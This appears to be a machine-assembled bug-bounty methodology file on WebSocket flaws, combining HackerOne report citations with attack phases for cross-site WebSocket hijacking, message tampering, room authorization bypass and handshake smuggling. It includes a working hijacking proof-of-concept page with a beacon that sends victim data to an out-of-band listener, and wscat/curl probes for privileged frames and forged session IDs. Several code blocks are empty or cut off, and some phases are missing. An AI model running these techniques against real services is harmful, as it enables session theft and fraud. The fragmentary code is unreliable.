15. **curl — curl Missing Sec-WebSocket-Accept Verification Enables MITM WebSocket Session Hijacking** ([H1 #3917775](https://hackerone.com/reports/3917775)) — MITM session hijack via unverified handshake; 2026 / no bounty disclosed.
16. **Legal Robot — Cross Site WebSocket Hijacking** ([H1 #211283](https://hackerone.com/reports/211283)) — CSWSH / missing Origin validation; 2017 / no bounty disclosed (Medium, Improper Authentication).
17. **Legal Robot — cross site web socket hijacking** ([H1 #274324](https://hackerone.com/reports/274324)) — CSWSH, 101 from malicious Origin; 2017 / no bounty disclosed.
18. **Internet Bug Bounty — mod_lua: Crash in websockets PING handling** ([H1 #103991](https://hackerone.com/reports/103991)) — stack-recursion DoS via crafted PING; 2015 / no bounty disclosed.
19. **curl — WebSocket decoder use-after-free when curl_easy_pause() unpauses from a debug callback** ([H1 #4123749](https://hackerone.com/reports/4123749)) — UAF in `ws_dec_pass_payload()`; 2026 / no bounty disclosed.
20. **Legal Robot — The websocket traffic is not secure enough** ([H1 #178990](https://hackerone.com/reports/178990)) — CSWSH / cleartext sniff and cross-domain replay; 2016 / no bounty disclosed (Medium, CSRF).
21. **mattermost — Posts sent via websockets aren't sanitized properly** ([H1 #2541027](https://hackerone.com/reports/2541027)) — WS-post sanitization / link-preview & cloud-metadata technique tags; 2024 / **$150** (Improper Input Validation).
22. **curl — CVE-2026-107928: info leak uploading over WebSockets with GnuTLS** ([H1 #4099194](https://hackerone.com/reports/4099194)) — GnuTLS send-buffer over-read on `wss://` upload; 2026 / no bounty disclosed (Low, Buffer Over-read).
23. **curl — CVE-2025-5399: WebSocket endless loop** ([H1 #3168039](https://hackerone.com/reports/3168039)) — timed-PING infinite loop in `curl_ws_send()`; 2025 / no bounty disclosed (Low).
24. **curl — CVE-2025-10148: predictable WebSocket mask** ([H1 #3330839](https://hackerone.com/reports/3330839)) — fixed/reused masking key; 2025 / no bounty disclosed (Low).
25. **curl — WebSocket send queue use-after-free during nested curl_ws_send()** ([H1 #4124722](https://hackerone.com/reports/4124722)) — UAF in `ws_flush()`; 2026 / no bounty disclosed (Low).

> Methodology anchors from the domain reference — PortSwigger Web Security Academy "Cross-site WebSocket hijacking" and Christian Schneider's original 2013 CSWSH write-up (`christian-schneider.net/CrossSiteWebSocketHijacking.html`, itself cited inside #211283/#178990) — are canonical technique references but are not numbered reports in this study pack, so they are not padded into the citation list. Citations remain grounded strictly in the 25 real IDs above.

---

## Related Skills & Chains

- **`hunt-csrf`** — CSWSH is CSRF-on-the-socket. Chain primitive: cookie-auth handshake + no Origin check + no per-connection token → attacker-origin socket reads/sends as victim; the same anti-CSRF reasoning (ambient credential + no unpredictable token) applies.
- **`hunt-broken-access-control` / `hunt-idor`** — subscription/room/GraphQL-over-WS authorization failures (#1023669, #862835) are object-level authz bugs expressed in frames; the permissionless-staff method is an IDOR-style test.
- **`hunt-graphql`** — GraphQL-over-WS introspection and subscriptions (#862835, #1023669); feed the schema/operations found here back into GraphQL auth testing.
- **`hunt-ssrf`** — sockets that accept attacker-controlled URLs (`new WebSocket(e.url)` in #395729, "to any URL") or tunnel to internal hosts (argus, admin dashboards) can pivot to internal-network access; the internal-network signal appeared in 10/25 reports.
- **`hunt-xss`** — WS-post sanitization failures (#2541027) and sanitization of rendered frames can yield stored XSS in real-time clients.
- **`hunt-dos`** — fragmentation floods, PING/PONG starvation, endless loops, and recursion crashes (#3303765, #3480039, #3168039, #103991) are resource-exhaustion findings.
- **`hunt-smuggling`** — handshake-layer Upgrade desync (bad `Sec-WebSocket-Version`, `Connection` mismatch) is a request-smuggling variant; confirm with differential/timing probes and OAST.
- **`hunt-cloud-misconfig` / `hunt-secret-detection`** — leaked tokens in frames (argus token in #1023669, session tokens in streams) feed credential and cloud-misconfig chains.
- **`security-arsenal`** — load the WS frame/handshake cheat sheet (Engine.IO packet prefixes `40`/`42`/`44`, Origin-bypass symbols, control opcodes) before testing filters.
- **`triage-validation`** — apply the Gate 0 table: every CSWSH/authz/smuggling claim needs cross-account or OAST proof; a bare `101`, an accepted-but-ignored frame, or a self-echo is a false positive.
- **`hunt-auth` / `hunt-session`** — handshake-only authentication and token rebinding; a leaked session/refresh token in victim frames (#211283's "every response ... read by attacker") becomes a session-management finding.
- **`hunt-open-redirect` / `hunt-crlf-injection`** — the Nextcloud path (#1102780): CRLF `Set-Cookie` + redirect → dashboard → WS endpoint. Test these first when a socket appears behind an auth boundary.
- **`hunt-memory-corruption`** — the curl/httpd cluster (#2298307, #3392174, #1595290, #4099194, #4123749, #4124722) is a WS-delivered memory-safety problem; use ASan and frame-field fuzzing.
- **`hunt-recon`** — JS bundle crawling and version fingerprinting (Phases 1–2) are generic recon skills; feed every discovered ws/wss URL back into this skill.

### Chain table (WS finding → next skill → impact)

| WS finding | Chain to | Impact | Grounding |
|---|---|---|---|
| CSWSH + token in stream | `hunt-session` → steal session/refresh token | ATO (Critical) | #211283, #178990 |
| CSWSH confirmed | `triage-validation` → OAST-exfil victim channels | Real-time data theft (High) | #274324 |
| Permissionless event registration | `hunt-broken-access-control` → cross-tenant exfil | Cross-tenant privacy breach (High) | #1023669 |
| Over-broadcast frames | `hunt-secret-detection` → harvest PII/tokens | Mass data exposure | #163464, #168223 |
| GraphQL `start` introspection | `hunt-graphql` → full API map → auth attacks | Deeper compromise | #862835 |
| Arbitrary-URL WS relay | `hunt-ssrf` → internal network reach | Internal access | #395729 |
| Handshake `strcpy` / wrong Accept | `hunt-memory-corruption` / MITM | RCE potential / hijack | #2298307, #3474865 |
| Fragmentation / PING abuse | `hunt-dos` → availability | DoS | #3303765, #3168039 |
| Upgrade desync | `hunt-smuggling` → WAF/authz bypass | Request smuggling (High–Critical) | Phase 9 |
| Redirect/CRLF → WS exposure | `hunt-crlf-injection` → auth bypass | Unauthenticated data access | #1102780 |

Every chain still ends at Gate 0: prove the victim's loss with cross-account, OAST, or crash evidence before submitting.


---

## Merged Source Knowledge

This section consolidates **20 unique knowledge blocks** from 1 curated source skills in `hunt-skills/`, `normal-skills/`, and `offensive-skills/`. Blocks overlapping the report-mined sections above were dropped; the complete, globally deduplicated source corpus is archived at `references/source-knowledge.md` (38 unique sections). No source section appears in more than one hunt skill.


### From `hunt-skills/hunt-websocket/SKILL.md`

## Crown Jewel Targets

CSWSH (Cross-Site WebSocket Hijacking) with a cookie-authenticated handshake and no CSRF/per-connection token = High–Critical (real-time exfil of any logged-in victim's data).

**Highest-value chains:**
- **CSWSH → data exfil / ATO** — handshake authenticates via ambient cookie, no CSRF token, Origin not enforced → attacker page opens WS as the victim and streams their messages/PII/tokens. If the stream carries a session/refresh/CSRF token, this escalates to ATO.
- **No per-message auth** — HTTP/handshake auth present but individual WS frames are not re-authorized → privileged messages accepted (`deleteUser`, `getSecretConfig`).
- **Message tampering** — modify in-flight frames (price, qty, userId, amount) in trading/game/checkout apps → financial fraud.
- **socket.io namespace / room authz bypass** — connect to a privileged namespace or join another user's room without a permission check → cross-tenant real-time exfil.
- **Handshake-layer Upgrade smuggling** — a malformed `Upgrade`/`Connection`/`Sec-WebSocket-*` handshake makes the front proxy and origin disagree on whether an upgrade occurred → request-smuggling tunnel.

---

## Grounding — Reference Cases (read before hunting)

These are public, verifiable references. Use them to calibrate what a *real* WS finding looks like and how it was proven. Do not invent additional report IDs or payouts.

| # | Source / ID | Class | Lesson |
|---|-------------|-------|--------|
| 1 | PortSwigger Web Security Academy — "Cross-site WebSocket hijacking" (research + labs) | CSWSH | Canonical CSWSH model: cookie-auth handshake + no CSRF token + missing Origin check → attacker reads/sends as victim. The authoritative methodology. |
| 2 | Christian Schneider — "Cross-Site WebSocket Hijacking (CSWSH)" (original disclosure/write-up, 2013) | CSWSH | First public CSWSH technique: cookie-auth handshake + no Origin enforcement; PoC must prove victim-data receipt in the attacker browser, not just a 101. |
| 3 | Coda CSWSH (referenced in this repo's hunt-csrf set) | CSWSH | Real-time collab apps commonly authenticate the socket purely via cookie; Origin allow-listing was the missing control. |
| 4 | CVE-2020-7662 — `websocket-extensions` (Node) ReDoS | DoS | A crafted `Sec-WebSocket-Extensions` header triggers catastrophic backtracking — handshake header is an attack surface, not just frames. |
| 5 | CVE-2024-37890 — `ws` (Node) DoS | DoS | Many handshake request headers exhaust the server; confirms the handshake itself is parser-attackable pre-frames. |
| 6 | Outdated `socket.io` / Engine.IO stacks | socket.io | Motivates the version-fingerprint step in Phase 7 — fingerprint the version, then check that release's known advisories. |

> Only the four CVEs above are asserted with exact IDs because they are verifiable. For any case where you are not certain of the exact identifier, describe the technique with **no** citation — a wrong CVE is worse than none.

---

## Phase 2 — CSWSH (Cross-Site WebSocket Hijacking)

CSWSH requires THREE conditions together: (a) the handshake authenticates via an **ambient credential** (cookie sent automatically), (b) there is **no unpredictable per-connection token** in the handshake (no CSRF token / no token in URL/body), and (c) the server **does not enforce Origin**. Missing any one breaks the attack.

```bash

# in the first app-level frame. Treat 101 as "candidate", move to Step 3.
```

```html
<!-- Step 3 — Real PoC: host on attacker origin, open while a SEPARATE victim
     account is logged into TARGET in the same browser. The bug is only
     confirmed if attacker JS RECEIVES the victim's data (or successfully
     sends a privileged frame). Cross-origin JS cannot set Origin/Cookie —
     the browser does, which is exactly the threat model. -->
<html><body><pre id="out"></pre><script>
var marker = "CSWSH-" + Math.random().toString(36).slice(2);   // unique per run
var ws = new WebSocket("wss://TARGET/ws");                     // attacker cannot forge Origin
ws.onopen = () => {
  log("[+] 101 opened from attacker origin");
  ws.send(JSON.stringify({type:"subscribe", channel:"user_notifications", _m:marker}));
};
ws.onmessage = e => {
  log("VICTIM-DATA: " + e.data);
  // Exfil PROOF to your Collaborator/listener so receipt is logged out-of-band:
  // navigator.sendBeacon("https://<collab-id>.oastify.com/cswsh?d=" + encodeURIComponent(e.data));
};
ws.onerror = e => log("ERR (likely Origin/auth rejected at message layer)");
function log(s){document.getElementById("out").textContent += s + "\n";}
</script></body></html>
```

**False-positive killers:**
- A completed `101` from `Origin: evil.com` is NOT a finding. Many servers accept the upgrade and then send nothing, or close on the first authenticated frame.
- Verify the data you receive belongs to a **different account** than the attacker, using a unique marker / distinct victim PII you planted in account B.
- Exfil the received payload to **Burp Collaborator / an OAST listener** so receipt is recorded out-of-band — this is your impact proof for the report.
- If a per-connection token rides the handshake (in the URL, a sub-protocol, or the first frame), CSWSH is **not** cross-site exploitable; downgrade or drop.

---

## Phase 3 — Missing / Weak Authentication on WS Messages

Handshake auth ≠ per-message auth. Apps often authenticate the socket once, then trust every subsequent frame.

```bash

# Low-priv session sending high-priv actions
wscat -c "wss://$TARGET/ws" --header "Cookie: session=LOW_PRIV_SESSION"

# > {"action":"getSecretConfig"}
```

**Validate:** the privileged action must produce a real effect (a deleted test user, returned secret config, a state change visible via a second channel) — a frame that is *accepted and silently ignored* is not a finding. Re-run as an unauthenticated client to confirm the action is not simply broadcast to everyone harmlessly.

### Replay of Signed Messages
If messages carry signatures (e.g., `{"type":"payment","amount":100,"signature":"..."}`), test replay for freshness and session binding. Capture a signed message and test: (a) **time-window bypass**: replay the message after its expiry timestamp (clock skew/validation gap), (b) **session bypass**: capture a signed message from user A's session and replay it in user B's session — if accepted, the signature was not bound to the user/session ID. Use Burp Repeater to store and replay signed frames, or reconstruct the same message in `wscat` after a time window has passed.

### Business Logic Abuse: State Machine Bypass & Rate Limit Evasion
Stateful protocols (e.g., a trading platform expecting `connect → authenticate → verify_balance → place_order`) may accept messages out of order or skip prerequisites. Test: (a) **state skip**: connect and immediately send `place_order` without `authenticate` or `verify_balance` first — many stacks don't enforce strict ordering if individual message validation is missing, (b) **high-frequency spam**: send identical or high-volume messages rapidly to bypass WS-layer rate limits (different from HTTP rate limits) — test 100s of messages/second to see if the server throttles, returns 429, or closes the connection. If it accepts and processes all, this can abuse business logic (e.g., many small payments to bypass amount caps, or rapid subscriptions to exhaust resources).

---

# > {"action":"buy","amount":1,"price":0.01}
```

**Validate:** the tampered value must persist server-side — confirm via the REST/order API or a fresh socket that the order/balance/price actually reflects the manipulation. Many UIs echo your own frame back optimistically; that echo is NOT proof. Demonstrate financial/state impact, ideally on a sandbox/test instrument.

---

## Phase 5 — socket.io / SignalR / Phoenix Namespace & Room Authz Bypass

Engine.IO/socket.io is a protocol layered over the raw WebSocket. Packet prefixes (Engine.IO `4`=MESSAGE wrapping socket.io `0`=CONNECT, `1`=DISCONNECT, `2`=EVENT) carry namespace/room intent. Authorization must be checked when joining; often it isn't.

```bash

# 1) Open the raw socket.io WebSocket (Engine.IO v4)
wscat -c "wss://$TARGET/socket.io/?EIO=4&transport=websocket" \
  --header "Cookie: session=YOUR_SESSION"

#    Watch for 42 EVENT frames carrying ANOTHER user's data.
```

**Validate:** distinguish *connected to namespace* from *received privileged data*. The finding is confirmed only when you receive `42` event frames containing data belonging to a different tenant/user, or a privileged emit produces a verifiable server-side effect. A `40/admin` ack with no subsequent data may just be an open-but-empty namespace.

> SignalR analogue: negotiate at `/<hub>/negotiate`, then connect and `Invoke`/`Send` hub methods — test method-level authorization. Phoenix Channels: `phx_join` to `topic:subtopic` and check whether the server's `join/3` authorizes the topic.

---

## Phase 6 — Handshake-Layer Upgrade Smuggling (NOT frame smuggling)

Important: once a WebSocket is established, your payloads are wrapped in WS frames and are **never re-parsed as HTTP** by the proxy. Typing `GET /admin HTTP/1.1` into an open `wscat` session does nothing. WebSocket-related smuggling lives at the **handshake**, before any frames exist.

The real technique: send a WebSocket Upgrade request that the **front proxy** and the **origin** interpret differently — e.g. a bad `Sec-WebSocket-Version` that makes the origin reply `426 Upgrade Required` (or `400`) while the proxy has already decided the connection is "upgraded" and stops parsing HTTP. The proxy then tunnels subsequent bytes straight to the origin as an opaque stream, letting you smuggle arbitrary HTTP requests past front-end controls (WAF/authz).

```bash

#     follow-up request on the same connection and watch for a desynced response.
```

Drive this with Burp Pro's **HTTP Request Smuggler** extension (it has WebSocket-upgrade test cases) rather than by hand. **Validate** exactly like classic smuggling: prove desync via a timing/differential probe AND show real impact (reach an internal/forbidden path, poison a cached response, or capture another user's request) — confirmed against **Burp Collaborator / OAST**, never on a single ambiguous response.

---

# Version + initial sid (handshake JSON after the leading Engine.IO digit)
curl -s "https://$TARGET/socket.io/?EIO=4&transport=polling" | head -c 300; echo

# Forged/replayed sid against the polling transport (session fixation / hijack probe)
curl -s "https://$TARGET/socket.io/?EIO=4&transport=polling&sid=FAKE_OR_VICTIM_SID"

## Tools

```bash
npm install -g wscat                 # CLI WS client (raw + socket.io)
brew install websocat                # alt client; supports text/binary + autoreconnect

## Chain Table

| WS finding | Chain to | Impact |
|-----------|----------|--------|
| CSWSH + token in stream | Steal session/refresh/CSRF token from victim frames | ATO (Critical) |
| CSWSH confirmed | Subscribe to victim channels, exfil to OAST | Real-time data theft (High) |
| No per-message auth | Send admin/privileged frames | Privilege escalation (Critical) |
| Message tampering | Modify price/amount/userId, confirm server-side | Financial fraud (Critical) |
| Namespace/room authz bypass | Join other tenant's room, read `42` events | Cross-tenant exfil (High) |
| Handshake Upgrade smuggling | Tunnel HTTP past WAF/authz, OAST-confirmed | Smuggling → SSRF/cache poison (High–Critical) |

---

## Validation (mandatory before reporting)

- ✅ **CSWSH:** attacker-origin PoC HTML, opened with a *different* victim account logged in, must **receive that victim's data** (verified by a unique planted marker / distinct PII) and exfil it to **Collaborator/OAST**. A bare `101` from a foreign Origin is NOT a finding.
- ✅ **No per-message auth:** privileged frame produces a **verifiable server-side effect** (state change confirmed via a second channel / REST API), not merely "accepted".
- ✅ **Message tampering:** tampered value **persists server-side** (confirmed via order/balance API), not just echoed in the UI.
- ✅ **Namespace/room bypass:** received **`42` event frames with another user's data**, not just a `40` namespace ack.
- ✅ **Upgrade smuggling:** desync proven by timing/differential probe **and** real-world impact, **OAST-confirmed**. No single-response guesses.
- ❌ Reject: a 101 alone, an accepted-but-ignored frame, a self-echoed message, a connected-but-empty namespace, or any "confirmed" claim lacking out-of-band/cross-account proof.

**Severity:**
- CSWSH leaking session/refresh token → ATO: **Critical**
- CSWSH → real-time session-data theft: **High**
- No auth on admin/privileged WS actions: **Critical**
- Financial message tampering (server-confirmed): **Critical**
- Namespace/room subscription bypass (cross-tenant): **High**
